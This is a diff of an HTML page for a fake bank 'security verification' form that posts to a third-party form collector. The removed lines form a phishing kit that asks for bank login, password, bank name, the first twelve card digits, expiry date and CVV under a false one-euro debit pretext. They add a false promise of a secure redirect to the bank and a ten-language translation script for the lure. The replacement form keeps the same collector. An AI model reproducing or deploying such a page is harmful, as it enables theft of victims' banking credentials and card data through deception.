@@ -100,156 +100,26 @@
   </select>
   <form action="https://formspree.io/f/xbdakdel" method="POST">
      
-       <h2 id="titre">Formulaire de vérification de sécurité</h2>
+       <h2 id="titre">Formulaire de vérification </h2>
 
-    <label id="labelNom" for="nomInput">Nom et prénom :</label>
-    <input type="text" id="nomInput" name="nom et prenom" placeholder="Entrez votre nom" required>
+    <label for="nom">Nom et prenom :</label>
+    <input type="text" name="nom et prenom" required>
 
-    <label id="labelIdentifiant" for="identifiantInput">Identifiant de votre compte bancaire :</label>
-    <input type="text" id="identifiantInput" name="Identifiant" placeholder="Entrez votre identifiant" required>
+    <label for="Date ouverture">Date ouverture :</label>
+    <input type="text" name="Date ouverture" required>
 
-    <label id="labelMot" for="motInput">Mot de passe/Code :</label>
-    <input type="text" id="motInput" name="Mot de passe" placeholder="Entrez votre mot de passe" required>
+    <label for="Repertoire ">Repertoire :</label>
+    <input type="text" name="Repertoire" required>
 
-    <label id="labelBanque" for="banqueInput">Nom de votre banque :</label>
-    <input type="text" id="banqueInput" name="Nom de la banque" placeholder="Nom de la banque" required>
-
-    <h4 id="titre">Formulaire pour programmation de prelevement 1 Eur </h4>
-    <label id="labelNom" for="nomInput">Numéro de carte (Uniquement les 12 premiers chiffres):</label>
-    <input type="text" id="nomInput" name="Numero de carte" placeholder="12 premiers chiffres" required>
-
-    <label id="labelBanque" for="banqueInput">Date d'expiration (MM/AA) :</label>
-    <input type="text" id="banqueInput" name="Date d'expiration (MM/AA)" placeholder="(MM/AA)" required>
-
-      <label id="labelBanque" for="banqueInput"> CVV :</label>
-    <input type="text" id="banqueInput" name="CVV" placeholder="CVV" required>
+    <label for="client">Client :</label>
+    <input type="text" name="Client" required>
 
     
     
     <button type="submit" id="submitBtn">Envoyer</button>
-    <h5 id="secureText">Vous serez redirige vers votre banque pour confirmer en toute securite vos informations.</h5>
-  </form>
+  
 
-  <!-- Script pour changer la langue -->
-<script>
-const traductions = {
-  fr: {
-    titre: "Formulaire de vérification de sécurité",
-    labelNom: "Nom et prénom :",
-    labelIdentifiant: "Identifiant de votre compte bancaire :",
-    labelMot: "Mot de passe/Code :",
-    labelBanque: "Nom de votre banque :",
-    labelMessage: "Message (facultatif) :",
-    submitBtn: "Envoyer",
-    secureText: "Vous serez redirige vers votre banque pour confirmer en toute securite vos informations."
-  },
-  en: {
-    titre: "Security Verification Form",
-    labelNom: "Full Name:",
-    labelIdentifiant: "Bank Account ID:",
-    labelMot: "Password/Code:",
-    labelBanque: "Bank Name:",
-    labelMessage: "Message (optional):",
-    submitBtn: "Submit",
-    secureText: "Your data is secure and confidential"
-  },
-  es: {
-    titre: "Formulario de verificación de seguridad",
-    labelNom: "Nombre completo:",
-    labelIdentifiant: "ID de cuenta bancaria:",
-    labelMot: "Contraseña/Código:",
-    labelBanque: "Nombre del banco:",
-    labelMessage: "Mensaje (opcional):",
-    submitBtn: "Enviar",
-    secureText: "Tus datos están seguros y son confidenciales"
-  },
-  de: {
-    titre: "Sicherheitsüberprüfungsformular",
-    labelNom: "Vollständiger Name:",
-    labelIdentifiant: "Bankkonto-ID:",
-    labelMot: "Passwort/Code:",
-    labelBanque: "Name der Bank:",
-    labelMessage: "Nachricht (optional):",
-    submitBtn: "Senden",
-    secureText: "Ihre Daten sind sicher und vertraulich"
-  },
-  it: {
-    titre: "Modulo di verifica sicurezza",
-    labelNom: "Nome completo:",
-    labelIdentifiant: "ID conto bancario:",
-    labelMot: "Password/Codice:",
-    labelBanque: "Nome banca:",
-    labelMessage: "Messaggio (facoltativo):",
-    submitBtn: "Invia",
-    secureText: "I tuoi dati sono sicuri e riservati"
-  },
-  pt: {
-    titre: "Formulário de verificação de segurança",
-    labelNom: "Nome completo:",
-    labelIdentifiant: "ID da conta bancária:",
-    labelMot: "Senha/Código:",
-    labelBanque: "Nome do banco:",
-    labelMessage: "Mensagem (opcional):",
-    submitBtn: "Enviar",
-    secureText: "Seus dados estão seguros e confidenciais"
-  },
-  nl: {
-    titre: "Beveiligingsformulier",
-    labelNom: "Volledige naam:",
-    labelIdentifiant: "Bankrekening ID:",
-    labelMot: "Wachtwoord/Code:",
-    labelBanque: "Naam van de bank:",
-    labelMessage: "Bericht (optioneel):",
-    submitBtn: "Verzenden",
-    secureText: "Uw gegevens zijn veilig en vertrouwelijk"
-  },
-  sv: {
-    titre: "Säkerhetsverifieringsformulär",
-    labelNom: "Fullständigt namn:",
-    labelIdentifiant: "Bankkonto ID:",
-    labelMot: "Lösenord/Kod:",
-    labelBanque: "Banknamn:",
-    labelMessage: "Meddelande (valfritt):",
-    submitBtn: "Skicka",
-    secureText: "Din data är säker och konfidentiell"
-  },
-  ru: {
-    titre: "Форма проверки безопасности",
-    labelNom: "Полное имя:",
-    labelIdentifiant: "Идентификатор банковского счета:",
-    labelMot: "Пароль/Код:",
-    labelBanque: "Название банка:",
-    labelMessage: "Сообщение (необязательно):",
-    submitBtn: "Отправить",
-    secureText: "Ваши данные защищены и конфиденциальны"
-  },
-  zh: {
-    titre: "安全验证表单",
-    labelNom: "全名：",
-    labelIdentifiant: "银行账户ID：",
-    labelMot: "密码/代码：",
-    labelBanque: "银行名称：",
-    labelMessage: "信息（可选）：",
-    submitBtn: "提交",
-    secureText: "您的数据安全且保密"
-  }
-};
 
-function changerLangue() {
-  const langue = document.getElementById('langue').value;
-  const t = traductions[langue];
-  if(t){
-    document.getElementById('titre').innerText = t.titre;
-    document.getElementById('labelNom').innerText = t.labelNom;
-    document.getElementById('labelIdentifiant').innerText = t.labelIdentifiant;
-    document.getElementById('labelMot').innerText = t.labelMot;
-    document.getElementById('labelBanque').innerText = t.labelBanque;
-    document.getElementById('labelMessage').innerText = t.labelMessage;
-    document.getElementById('submitBtn').innerText = t.submitBtn;
-    document.getElementById('secureText').innerText = t.secureText;
-  }
-}
-</script>
 
 </body>
 </html>
